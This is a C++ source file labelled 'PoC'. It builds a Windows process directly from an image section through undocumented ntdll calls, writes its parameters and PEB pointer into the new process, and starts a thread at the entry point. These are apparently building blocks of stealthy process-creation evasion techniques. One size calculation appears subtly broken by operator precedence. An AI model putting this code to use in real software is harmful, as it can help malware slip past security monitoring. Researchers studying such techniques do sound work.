#include <stdafx.h>
#include "WinInternals.h"

#include <winternl.h>
#include <handleapi.h>
#include <libloaderapi.h>
#include <memoryapi.h>

#ifndef SEC_IMAGE
#define SEC_IMAGE                   0x01000000
#endif

#ifndef PS_INHERIT_HANDLES
#define PS_INHERIT_HANDLES 4
#endif

#ifndef RTL_MAX_DRIVE_LETTERS
#define RTL_MAX_DRIVE_LETTERS 32
#endif

#ifndef RTL_USER_PROC_PARAMS_NORMALIZED
#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001
#endif

typedef NTSTATUS (NTAPI *fpZwClose)
(
	__in HANDLE Handle
);

typedef NTSTATUS (NTAPI *fpNtCreateSection)
(
	__out PHANDLE SectionHandle,
	__in ACCESS_MASK DesiredAccess,
	__in_opt POBJECT_ATTRIBUTES ObjectAttributes,
	__in_opt PLARGE_INTEGER MaximumSize,
	__in ULONG SectionPageProtection,
	__in ULONG AllocationAttributes,
	__in_opt HANDLE FileHandle
);

typedef NTSTATUS (NTAPI *fpNtCreateProcessEx)
(
	OUT PHANDLE           ProcessHandle,
	IN ACCESS_MASK        DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes  OPTIONAL,
	IN HANDLE             ParentProcess,
	IN ULONG              Flags,
	IN HANDLE             SectionHandle     OPTIONAL,
	IN HANDLE             DebugPort         OPTIONAL,
	IN HANDLE             ExceptionPort     OPTIONAL,
	IN BOOLEAN            InJob
);

typedef struct _CURDIR
{
	UNICODE_STRING DosPath;
	HANDLE Handle;
} CURDIR, *PCURDIR;

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	USHORT Flags;
	USHORT Length;
	ULONG TimeStamp;
	UNICODE_STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS_
{
	ULONG MaximumLength;
	ULONG Length;

	ULONG Flags;
	ULONG DebugFlags;

	HANDLE ConsoleHandle;
	ULONG ConsoleFlags;
	HANDLE StandardInput;
	HANDLE StandardOutput;
	HANDLE StandardError;

	CURDIR CurrentDirectory;
	UNICODE_STRING DllPath;
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
	PVOID Environment;

	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;

	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING WindowTitle;
	UNICODE_STRING DesktopInfo;
	UNICODE_STRING ShellInfo;
	UNICODE_STRING RuntimeData;
	RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

	ULONG_PTR EnvironmentSize;
	ULONG_PTR EnvironmentVersion;
	PVOID PackageDependencyData;
	ULONG ProcessGroupId;
	ULONG LoaderThreads;
} RTL_USER_PROCESS_PARAMETERS_, *PRTL_USER_PROCESS_PARAMETERS_;

typedef NTSTATUS (NTAPI *fpRtlCreateProcessParametersEx)
(
	_Out_ PRTL_USER_PROCESS_PARAMETERS_ *pProcessParameters,
	_In_ PUNICODE_STRING ImagePathName,
	_In_opt_ PUNICODE_STRING DllPath,
	_In_opt_ PUNICODE_STRING CurrentDirectory,
	_In_opt_ PUNICODE_STRING CommandLine,
	_In_opt_ PVOID Environment,
	_In_opt_ PUNICODE_STRING WindowTitle,
	_In_opt_ PUNICODE_STRING DesktopInfo,
	_In_opt_ PUNICODE_STRING ShellInfo,
	_In_opt_ PUNICODE_STRING RuntimeData,
	_In_ ULONG Flags // pass RTL_USER_PROC_PARAMS_NORMALIZED to keep parameters normalized
);

typedef NTSTATUS (NTAPI *fpNtCreateThreadEx)
(
	OUT PHANDLE               hThread,
	IN ACCESS_MASK            DesiredAccess,
	IN LPVOID                 ObjectAttributes,
	IN HANDLE                 ProcessHandle,
	IN LPTHREAD_START_ROUTINE lpStartAddress,
	IN LPVOID                 lpParameter,
	IN BOOL                   CreateSuspended,
	IN ULONG                  StackZeroBits,
	IN ULONG                  SizeOfStackCommit,
	IN ULONG                  SizeOfStackReserve,
	OUT LPVOID                lpBytesBuffer
);

typedef struct _SECTION_IMAGE_INFORMATION
{
	PVOID EntryPoint;
	ULONG ZeroBits;
	ULONG MaximumStackSize;
	ULONG CommittedStackSize;
	ULONG SubSystemType;
	union
	{
		struct
		{
			WORD SubSystemMinorVersion;
			WORD SubSystemMajorVersion;
		};
		ULONG SubSystemVersion;
	};
	ULONG GpValue;
	WORD ImageCharacteristics;
	WORD DllCharacteristics;
	WORD Machine;
	UCHAR ImageContainsCode;
	UCHAR ImageFlags;
	ULONG ComPlusNativeReady : 1;
	ULONG ComPlusILOnly : 1;
	ULONG ImageDynamicallyRelocated : 1;
	ULONG Reserved : 5;
	ULONG LoaderFlags;
	ULONG ImageFileSize;
	ULONG CheckSum;
} SECTION_IMAGE_INFORMATION, *PSECTION_IMAGE_INFORMATION;

typedef enum _SECTION_INFORMATION_CLASS
{
	SectionBasicInformation,
	SectionImageInformation
} SECTION_INFORMATION_CLASS, *PSECTION_INFORMATION_CLASS;

typedef NTSTATUS(NTAPI *fpNtQuerySection)
(
	IN HANDLE               SectionHandle,
	IN SECTION_INFORMATION_CLASS InformationClass,
	OUT PVOID               InformationBuffer,
	IN ULONG                InformationBufferSize,
	OUT PULONG              ResultLength OPTIONAL
);

typedef struct _RTL_USER_PROCESS_INFORMATION
{
	ULONG Length;
	HANDLE Process;
	HANDLE Thread;
	CLIENT_ID ClientId;
	SECTION_IMAGE_INFORMATION ImageInformation;
} RTL_USER_PROCESS_INFORMATION, *PRTL_USER_PROCESS_INFORMATION;

typedef NTSTATUS(NTAPI *fpRtlCreateUserProcess)
(
	_In_ PUNICODE_STRING NtImagePathName,
	_In_ ULONG AttributesDeprecated,
	_In_ PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
	_In_opt_ PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
	_In_opt_ PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
	_In_opt_ HANDLE ParentProcess,
	_In_ BOOLEAN InheritHandles,
	_In_opt_ HANDLE DebugPort,
	_In_opt_ HANDLE TokenHandle, // used to be ExceptionPort
	_Out_ PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

typedef VOID(NTAPI *fpRtlInitUnicodeString)
(
	_Out_    PUNICODE_STRING DestinationString,
	_In_opt_ PCWSTR          SourceString
);

typedef NTSTATUS(NTAPI *fpNtQueryInformationProcess)
(
	IN HANDLE ProcessHandle,
	IN PROCESSINFOCLASS ProcessInformationClass,
	OUT PVOID ProcessInformation,
	IN ULONG ProcessInformationLength,
	OUT PULONG ReturnLength OPTIONAL
);

typedef NTSTATUS(NTAPI *fpNtResumeThread)
(
	_In_ HANDLE      ThreadHandle,
	_Out_opt_ PULONG SuspendCount
);

static const auto ZwClose = (fpZwClose)::GetProcAddress(::LoadLibraryA("ntdll.dll"), "ZwClose");
static const auto NtCreateSection = (fpNtCreateSection)::GetProcAddress(::LoadLibraryA("ntdll.dll"), "NtCreateSection");
static const auto NtQuerySection = (fpNtQuerySection)::GetProcAddress(::LoadLibraryA("ntdll.dll"), "NtQuerySection");
static const auto NtCreateProcessEx = (fpNtCreateProcessEx)::GetProcAddress(::LoadLibraryA("ntdll.dll"), "NtCreateProcessEx");
static const auto NtCreateThreadEx = (fpNtCreateThreadEx)::GetProcAddress(::LoadLibraryA("ntdll.dll"), "NtCreateThreadEx");
static const auto RtlCreateProcessParametersEx = (fpRtlCreateProcessParametersEx)::GetProcAddress(::LoadLibraryA("ntdll.dll"), "RtlCreateProcessParametersEx");
static const auto RtlInitUnicodeString_ = (fpRtlInitUnicodeString)::GetProcAddress(::LoadLibraryA("ntdll.dll"), "RtlInitUnicodeString");
static const auto NtQueryInformationProcess_ = (fpNtQueryInformationProcess)::GetProcAddress(::LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess");
static const auto NtResumeThread = (fpNtResumeThread)::GetProcAddress(::LoadLibraryA("ntdll.dll"), "NtResumeThread");

namespace PoC
{
	void CheckIfAllFunctionsAreAvailable()
	{
		if (!ZwClose)
			throw "Failed to get ZwClose from ntdll.dll";
		if (!NtCreateSection)
			throw "Failed to get NtCreateSection from ntdll.dll";
		if (!NtQuerySection)
			throw "Failed to get NtQuerySection from ntdll.dll";
		if (!NtCreateProcessEx)
			throw "Failed to get NtCreateProcessEx from ntdll.dll";
		if (!NtCreateThreadEx)
			throw "Failed to get NtCreateThreadEx from ntdll.dll";
		if (!RtlCreateProcessParametersEx)
			throw "Failed to get RtlCreateProcessParametersEx from ntdll.dll";
		if (!RtlInitUnicodeString_)
			throw "Failed to get RtlInitUnicodeString from ntdll.dll";
		if (!NtQueryInformationProcess_)
			throw "Failed to get NtQueryInformationProcess from ntdll.dll";
		if (!NtResumeThread)
			throw "Failed to get NtResumeThread from ntdll.dll";
	}

	Handle::Handle(void* handle)
		: m_handle(handle)
	{
	}

	Handle::Handle(Handle&& other)
	{
		m_handle = other.m_handle;
		other.m_handle = nullptr;
	}

	Handle& Handle::operator=(Handle&& other)
	{
		Handle handle;
		handle.m_handle = m_handle;
		m_handle = other.m_handle;
		other.m_handle = nullptr;
		return *this;
	}

	Handle::~Handle()
	{
		if (m_handle)
			::CloseHandle(m_handle);
	}

	Handle::operator void*() const
	{
		return m_handle;
	}

	void** Handle::operator&()
	{
		return &m_handle;
	}

	Section Section::Create(void* hFile)
	{
		Section section;

		const auto status = ::NtCreateSection(
			&section.m_handle,
			SECTION_ALL_ACCESS, // DesiredAccess [in]
			NULL,               // ObjectAttributes [in, optional]
			0,                  // MaximumSize [in, optional]
			PAGE_READONLY,      // SectionPageProtection [in]
			SEC_IMAGE,          // AllocationAttributes [in]
			hFile               // FileHandle [in, optional]
		);
		if (!NT_SUCCESS(status))
			throw status;

		return section;
	}

	void* Section::GetEntryPoint() const
	{
		BYTE buffer[128] = {0};
		const auto status = ::NtQuerySection
		(
			m_handle,
			SectionImageInformation,
			buffer,
			sizeof(buffer),
			NULL
		);
		if (!NT_SUCCESS(status))
			throw status;

		const auto info = (PSECTION_IMAGE_INFORMATION)buffer;
		return info->EntryPoint;
	}

	Process Process::Create(void* hSection)
	{
		Process process;

		//WCHAR buffer[MAX_PATH] = { 0 };
		//wcscpy_s(buffer, path);

		//UNICODE_STRING objectName;
		//objectName.Buffer = buffer;
		//objectName.Length = (USHORT)wcslen(buffer) * (USHORT)sizeof(WCHAR);
		//objectName.MaximumLength = sizeof(buffer);

		//OBJECT_ATTRIBUTES oa = { 0 };
		//oa.Length = sizeof(oa);
		//oa.Attributes = OBJ_CASE_INSENSITIVE;
		//oa.ObjectName = &objectName;

		const auto status = ::NtCreateProcessEx
		(
			&process.m_handle,
			GENERIC_ALL,
			NULL,
			(HANDLE)-1,
			PS_INHERIT_HANDLES,
			hSection,
			NULL,
			NULL,
			FALSE
		);

		if (!NT_SUCCESS(status))
			throw status;

		return process;
	}

	void Thread::Resume() const
	{
		const auto status = ::NtResumeThread(m_handle, NULL);
		if (!NT_SUCCESS(status))
			throw status;
	}

	Thread Thread::Create(const wchar_t* path, void* hProcess, void* entryPoint)
	{
		UNICODE_STRING string;
		::RtlInitUnicodeString_(&string, path);

		PRTL_USER_PROCESS_PARAMETERS_ params = NULL;

		{
			const auto status = ::RtlCreateProcessParametersEx
			(
				&params,
				&string,
				NULL,
				NULL,
				&string,
				NULL,
				NULL,
				NULL,
				NULL,
				NULL,
				RTL_USER_PROC_PARAMS_NORMALIZED
			);
			if (!NT_SUCCESS(status))
				throw status;
		}

		const SIZE_T size =
			(DWORD)params & 0xFFFF +
			params->EnvironmentSize +
			params->MaximumLength;

		const auto remote = ::VirtualAllocEx
		(
			hProcess,
			params,
			size,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_READWRITE
		);

		{
			const auto success = ::WriteProcessMemory
			(
				hProcess,
				params,
				params,
				params->EnvironmentSize + params->MaximumLength,
				NULL
			);

			if (!success)
				throw "Failed to write process memory";
		}

		PROCESS_BASIC_INFORMATION info = { 0 };

		{
			const auto status = ::NtQueryInformationProcess_
			(
				hProcess,
				ProcessBasicInformation,
				&info,
				sizeof(info),
				NULL
			);

			if (!NT_SUCCESS(status))
				throw status;
		}

		PEB* peb = info.PebBaseAddress;
		if (!peb)
			throw "Failed to get PEB address";

		{
			const auto success = ::WriteProcessMemory
			(
				hProcess,
				&peb->ProcessParameters,
				&params,
				sizeof(LPVOID),
				NULL
			);
			if (!success)
				throw "Failed to write process memory";
		}

		Thread thread;

		{
			const auto status = ::NtCreateThreadEx
			(
				&thread.m_handle,
				GENERIC_ALL,
				NULL,
				hProcess,
				(PTHREAD_START_ROUTINE)entryPoint,
				NULL,
				TRUE,
				0,
				0,
				0,
				NULL
			);
			if (!NT_SUCCESS(status))
				throw status;
		}

		return thread;
	}
}
